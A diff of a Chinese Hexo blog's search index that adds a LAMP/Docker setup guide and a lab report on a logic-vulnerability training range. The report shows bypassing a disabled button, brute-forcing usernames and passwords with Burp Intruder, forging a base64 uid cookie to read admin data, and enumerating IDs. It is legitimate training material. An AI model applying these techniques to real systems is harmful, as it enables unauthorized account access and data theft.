-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
-
-<p>将爆出的用户名装载进有效负载集，爆破密码</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-
-<p>使用爆破出的用户名及密码成功登录</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
-<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
-<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
-<p>欲获取admin与admin1的个人信息，先将用户名base64编码</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
-<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
-<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
-<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
-<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
-<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
-<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
-<p>点击开始攻击，等待一段时间，得到爆破结果</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
-
-<p>查询结果</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
-<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
-<p>将数据包发送到intruder模块，设置如下图</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
-<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
-<p>等待一段时间后，得到爆破结果<code>735142</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312042101819.png"></p>
-<p>查询编号得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -5210,6 +5106,132 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次搭建LAMP web环境</title>
+    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
+<p>终端输入<code>php -v</code>查看PHP版本</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
+<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
+<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
+<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
+<p>服务正常启动</p>
+<p>接下来在网站测试服务是否可用</p>
+<p>linux浏览器输入localhost，若回显页面</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
+<p>说明Apache服务正常</p>
+<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
+<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
+<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
+<p>以上做完说明web环境被成功搭建</p>
+<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
+<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
+<p>输入<code>docker images</code>查看下载的镜像</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
+<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
+<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
+<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
+<p>和之前一样开启Apache和MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
+<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
+<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
+<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
+<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
+<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
+<p>以上做完则成功在docker中搭建了lamp web环境</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>LAMP</tag>
+        <tag>环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑漏洞靶场环境——logic</title>
+    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
+<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
+<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
+<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
+<p>burpsuite开启代理</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
+<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
+
+<p>将爆出的用户名装载进有效负载集，爆破密码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p>使用爆破出的用户名及密码成功登录</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
+<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
+<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
+<p>欲获取admin与admin1的个人信息，先将用户名base64编码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
+<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
+<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
+<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
+<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
+<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
+<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
+<p>点击开始攻击，等待一段时间，得到爆破结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
+<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
+<p>将数据包发送到intruder模块，设置如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
+<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
+<p>等待一段时间后，得到爆破结果<code>735142</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312042101819.png"></p>
+<p>查询编号得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
       </tags>
   </entry>
 </search>
